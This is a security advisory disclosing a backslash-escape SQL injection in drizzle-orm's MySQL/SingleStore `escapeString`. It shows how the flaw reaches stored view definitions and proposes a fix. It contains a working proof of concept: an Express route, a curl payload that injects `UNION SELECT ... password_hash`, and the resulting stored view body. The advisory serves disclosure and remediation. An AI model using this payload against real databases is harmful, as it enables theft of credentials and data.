# Title

SQL injection in `drizzle-orm` MySQL/SingleStore `escapeString` allows breakout from inlined string literals under default `sql_mode`, leading to stored SQL injection through `mysqlView` view definitions

### Summary

`MySqlDialect.escapeString` (and its SingleStore counterpart) doubles single quotes but does not escape backslashes. MySQL's default `sql_mode` does not include `NO_BACKSLASH_ESCAPES`, so the parser interprets `\'` inside a single-quoted literal as an escaped quote. A user-controlled input ending in `\'` therefore swallows the closing quote that Drizzle appends, breaks out of the literal, and lets the attacker append arbitrary SQL.

The most damaging reach is `mysqlView(...).as(qb)`. The view-builder pipeline inlines every `Param` through `escapeString` and sends the resulting SQL to MySQL as `CREATE VIEW ... AS SELECT ...`. The injection therefore lands as a stored view body that fires on every subsequent read.

### Details

In `targets/drizzle-orm/drizzle-orm/src/mysql-core/dialect.ts:108`:

```ts
escapeString(str: string): string {
    return `'${str.replace(/'/g, "''")}'`;
}
```

The same shape exists at `targets/drizzle-orm/drizzle-orm/src/singlestore-core/dialect.ts:107`.

Under MySQL 8 default `sql_mode` (`ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION`), backslash escapes inside string literals are honoured. Given input `x\' UNION SELECT password FROM users -- `, the function returns `'x\'' UNION SELECT password FROM users -- '`. MySQL parses that as the literal `x'`, followed by `UNION SELECT password FROM users` outside the literal, followed by a line comment that swallows whatever the library appended to close the statement.

The reach path is the view builder. `mysqlView(name).as(qb)` calls `qb.getSQL().inlineParams()` (`targets/drizzle-orm/drizzle-orm/src/mysql-core/view.ts:80,133`), which delegates each `Param` to `mapInlineParam` (`targets/drizzle-orm/drizzle-orm/src/sql/sql.ts:244-245`), which finally hits `MySqlDialect.escapeString`. The resulting SQL is sent to MySQL as a `CREATE VIEW ... AS (SELECT ... WHERE ... = '<escaped-input>')` statement.

Because the view body is wrapped in `( ... )` by drizzle-kit's view emitter, the payload must include one extra `)` to balance the opening paren before the `--` line comment swallows the trailing `);`.

The same backslash bypass also fires from any caller that explicitly invokes `.inlineParams()` on a `sql` template (custom prepared-statement compilation, query logging, snapshot testing, and so on).

### PoC

Runnable service at `poc/services/svc1-view-injection/`, sharing the MySQL 8.4 backend defined in `poc/services/docker-compose.yml`. The route does no string concatenation with the request body. The only place the input is touched is `eq(users.username, name)`.

```js
app.post('/saved-search', async (req, res) => {
    const { name } = req.body;
    const savedView = mysqlView('svc1_saved_search').as((qb) =>
      qb.select({ id: users.id, username: users.username })
        .from(users)
        .where(eq(users.username, name)),
    );
    const cur = await generateMySQLDrizzleJson({ users, savedView });
    const statements = await generateMySQLMigration(prevSnapshot, cur);
    await conn.query('DROP VIEW IF EXISTS svc1_saved_search');
    for (const stmt of statements) await conn.query(stmt);
    res.json({ statements });
});
```

Bring up the stack and trigger the bug:

```
cd poc/services
docker compose up -d mysql
cd svc1-view-injection && npm install && node index.js   # listens on :3001

curl -X POST http://127.0.0.1:3001/saved-search \
  -H 'content-type: application/json' \
  -d $'{"name":"x\\\\\' UNION SELECT id, password_hash FROM users_svc1 ) -- "}'

curl http://127.0.0.1:3001/saved-search
```

The view body Drizzle ended up storing in MySQL:

```
CREATE ALGORITHM = undefined SQL SECURITY definer
VIEW `svc1_saved_search` AS (
    select `id`, `username` from `users_svc1`
     where `users_svc1`.`username` = 'x\'' UNION SELECT id, password_hash FROM users_svc1 ) -- '
);
```

MySQL parses that as `WHERE username = 'x'` (because `\'` closed and the next `'` then closed the literal), then `UNION SELECT id, password_hash FROM users_svc1`, then `)` balancing the library's opening paren, then a line comment that swallows the trailing `);`. The view declared columns `(id, username)`, but after injection the `username` column returns `password_hash`.

### Impact

Stored SQL injection inside a public Drizzle API that the documentation describes as safe to call with arbitrary string input. Any application that uses `mysqlView` with a user-controlled `WHERE` clause is vulnerable. Realistic patterns include saved searches, tenant-scoped views, "share this query as a view" features, and any logging path that calls `.inlineParams()`.

Because the injection persists in the view body, every later read of the view executes the injected SQL with the privileges of the database account that defined the view. Confidentiality, integrity, and availability are all impacted: arbitrary `SELECT` against any table the view definer can read, exposure of password hashes and other secrets through `UNION` projections, and the ability to chain into `INSERT` / `UPDATE` / `DELETE` if the deployment also uses inline-param paths on writes.

### Affected products

Ecosystem: npm.
Package name: `drizzle-orm`.
Affected versions: `<= 0.45.3` (the `mysql-core` and `singlestore-core` dialects).
Patched versions: none at time of report.

### Severity

CVSS 3.1 vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` (score 7.5, High).

`AC:H` reflects that exploitation requires the application to use `mysqlView` (or another `.inlineParams()` sink) with user input. `PR:L` reflects the common deployment in which authenticated users can save searches or pin queries.

### Weaknesses

CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection).

### Fix

Add a backslash-escape pass before the quote-doubling pass for any dialect whose active `sql_mode` honours backslash escapes (MySQL, SingleStore).

```ts
escapeString(str: string): string {
    return `'${str.replace(/\\/g, '\\\\').replace(/'/g, "''")}'`;
}
```

Order matters: backslashes first, then quotes.
